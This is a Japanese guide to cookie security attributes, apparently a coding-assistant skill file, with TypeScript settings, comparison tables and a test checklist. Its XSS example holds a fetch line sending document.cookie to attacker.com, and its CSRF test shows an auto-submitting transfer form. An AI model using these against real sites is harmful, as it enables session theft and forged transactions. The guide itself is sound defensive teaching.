# Cookie属性の詳細ガイド

## 必須属性

### HttpOnly属性

**効果**: JavaScriptからCookieへのアクセスを禁止

**セキュリティメリット**:
- XSS攻撃からトークンを保護
- `document.cookie`でアクセス不可
- ブラウザがHTTPリクエスト時のみCookieを送信

**設定**:
```typescript
httpOnly: true // 常にtrue推奨
```

**攻撃シナリオと防御**:
```javascript
// XSS攻撃例
<script>
  // ❌ HttpOnly=false: トークン窃取される
  fetch('https://attacker.com/steal?token=' + document.cookie);

  // ✅ HttpOnly=true: document.cookieでアクセス不可 → 防御
</script>
```

### Secure属性

**効果**: HTTPS通信のみでCookieを送信

**セキュリティメリット**:
- 中間者攻撃によるトークン傍受を防止
- HTTP通信ではCookieが送信されない

**設定**:
```typescript
secure: process.env.NODE_ENV === 'production'
// 本番: true、開発（localhost）: false
```

**判断基準**:
- 本番環境: 必須（true）
- 開発環境（localhost）: false（HTTPSなし）
- ステージング環境: true（HTTPS使用）

### SameSite属性

**オプションと効果**:

**Strict（最高保護）**:
```typescript
sameSite: 'strict'
```
- クロスサイトリクエストでCookie一切送信なし
- CSRF攻撃を完全に防止
- ユーザビリティ制約: 外部リンクからのアクセス時も未認証扱い

**使用場面**:
- 高セキュリティアプリ（銀行、医療等）
- クロスサイトリンクが不要

**Lax（バランス型、推奨）**:
```typescript
sameSite: 'lax'
```
- トップレベルナビゲーション（GET）では送信
- フォーム送信（POST）等では送信なし
- CSRFを防ぎつつユーザビリティ維持

**使用場面**:
- 一般的なWebアプリケーション（推奨）
- 外部リンクからのアクセスを許可したい

**None（クロスサイト許可）**:
```typescript
sameSite: 'none' // + secure: true必須
```
- すべてのクロスサイトリクエストで送信
- Secure属性必須（HTTPS）
- CSRF対策を別途実装必須

**使用場面**:
- 埋め込みiframe
- サードパーティAPI（クロスドメイン）

**比較表**:

| SameSite | CSRF保護 | 外部リンク | フォーム送信 | 推奨度 |
|----------|---------|----------|------------|--------|
| Strict | ⭐⭐⭐⭐⭐ | ❌ | ❌ | 高セキュリティアプリ |
| Lax | ⭐⭐⭐⭐ | ✅ (GET) | ❌ | 一般的アプリ（推奨） |
| None | ❌ | ✅ | ✅ | クロスドメイン必須時 |

### Path属性

**効果**: Cookieの送信先パスを制限

**最小権限の原則**:
```typescript
// アクセストークン: 全パスで使用
path: '/'

// リフレッシュトークン: /api/auth/refreshのみ
path: '/api/auth/refresh'

// 管理者セッション: /adminのみ
path: '/admin'
```

**メリット**:
- 不要な箇所へのトークン露出を防止
- 攻撃対象範囲の最小化

### Domain属性

**効果**: Cookieの送信先ドメインを制限

**設定パターン**:
```typescript
// 現在のドメインのみ（デフォルト）
domain: undefined

// サブドメイン間で共有
domain: '.example.com' // api.example.com、app.example.comで共有
```

**判断基準**:
- サブドメインごとに独立認証 → domain未設定
- サブドメイン間でセッション共有 → domain設定

**セキュリティ考慮**:
- domainを広く設定すると攻撃対象範囲が拡大
- 最小権限の原則に従って最小限のドメインに制限

### Max-Age / Expires属性

**Max-Age（推奨）**:
```typescript
maxAge: 3600 // 秒単位、1時間
```
- 相対時間（秒単位）
- シンプルで分かりやすい
- Expiresより優先される

**Expires**:
```typescript
expires: new Date('2025-12-31T23:59:59Z')
```
- 絶対時刻（GMT）
- 古いブラウザ対応用

**推奨**: Max-Ageを使用（シンプル、明確）

## Cookie設定の組み合わせパターン

### Pattern 1: 高セキュリティアプリ

```typescript
cookies().set('session_token', token, {
  httpOnly: true,         // XSS対策
  secure: true,           // HTTPS必須
  sameSite: 'strict',     // 最高CSRF保護
  maxAge: 15 * 60,        // 15分
  path: '/',
  domain: undefined,      // 現在のドメインのみ
});
```

**適用**: 銀行、医療、行政システム

### Pattern 2: 一般的なWebアプリ（推奨）

```typescript
cookies().set('session_token', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',        // バランス型
  maxAge: 60 * 60,        // 1時間
  path: '/',
});
```

**適用**: EC、SaaS、コミュニティサイト

### Pattern 3: 埋め込み・クロスドメイン

```typescript
cookies().set('session_token', token, {
  httpOnly: true,
  secure: true,           // None使用時は必須
  sameSite: 'none',       // クロスサイト許可
  maxAge: 60 * 60,
  path: '/',
});
```

**適用**: iframe埋め込み、サードパーティAPI

## ブラウザ互換性

### SameSite属性サポート

| ブラウザ | Strict | Lax | None |
|---------|--------|-----|------|
| Chrome 51+ | ✅ | ✅ | ✅ |
| Firefox 60+ | ✅ | ✅ | ✅ |
| Safari 12+ | ✅ | ✅ | ✅ |
| Edge 16+ | ✅ | ✅ | ✅ |

**フォールバック**:
- 古いブラウザ: SameSiteなし → CSRF対策を別途実装必須

### Secure属性の制約

**HTTPS必須**:
- Secure=trueはHTTPS環境でのみ機能
- HTTP環境では警告が出る
- 開発環境（localhost）のみ例外

**localhost例外**:
```typescript
secure: process.env.NODE_ENV === 'production' || request.url.startsWith('https://')
```

## セキュリティ検証

### チェックリスト

**Cookie設定検証**:
- [ ] HttpOnly=true（XSS対策）
- [ ] Secure=true（本番環境）
- [ ] SameSite=Lax/Strict（CSRF対策）
- [ ] Max-Age設定（有効期限）
- [ ] Path最小化（最小権限）

**セキュリティテスト**:
- [ ] XSS攻撃でトークン取得不可か？
- [ ] CSRF攻撃が防げるか？
- [ ] 中間者攻撃でトークン傍受されないか？
- [ ] HTTP環境でCookie送信されないか？

### ペネトレーションテスト

**XSSテスト**:
```javascript
// ブラウザコンソールで実行
document.cookie; // HttpOnly=trueなら空またはHttpOnly以外のCookieのみ
```

**CSRFテスト**:
```html
<!-- 攻撃者のサイト -->
<form action="https://victim.com/api/transfer" method="POST">
  <input name="amount" value="1000000">
</form>
<script>document.forms[0].submit();</script>
<!-- SameSite=Lax/Strictなら失敗 -->
```

## トラブルシューティング

### 問題: Cookieが設定されない

**原因**:
- Secure=trueだがHTTP環境
- SameSite=NoneだがSecure=false
- Pathが一致しない
- Domainが一致しない

**解決**:
- 開発環境ではSecure=false
- SameSite=NoneならSecure=true必須
- Path/Domain設定を確認

### 問題: クロスサイトでCookieが送信されない

**原因**:
- SameSite=Strict/Lax

**解決**:
- クロスサイト必須ならSameSite=None + Secure=true
- またはCSRFトークン等の代替対策

### 問題: ログアウト後もセッションが有効

**原因**:
- Cookie削除が不完全
- Max-Age=0設定漏れ
- Path/Domain不一致

**解決**:
```typescript
cookies().delete('session_token'); // または
cookies().set('session_token', '', {
  maxAge: 0,
  path: '/', // 設定時と同じPath/Domain
});
```

## まとめ

**Cookie属性の鉄則**:
1. **HttpOnly**: 常にtrue（XSS対策）
2. **Secure**: 本番環境でtrue（中間者攻撃対策）
3. **SameSite**: Lax/Strict推奨（CSRF対策）
4. **Path**: 最小権限（必要なパスのみ）
5. **Max-Age**: 明確な有効期限設定

**参照**:
- 実装テンプレート: `.claude/skills/session-management/templates/`
- セキュリティ対策: `.claude/skills/session-management/resources/session-security-measures.md`
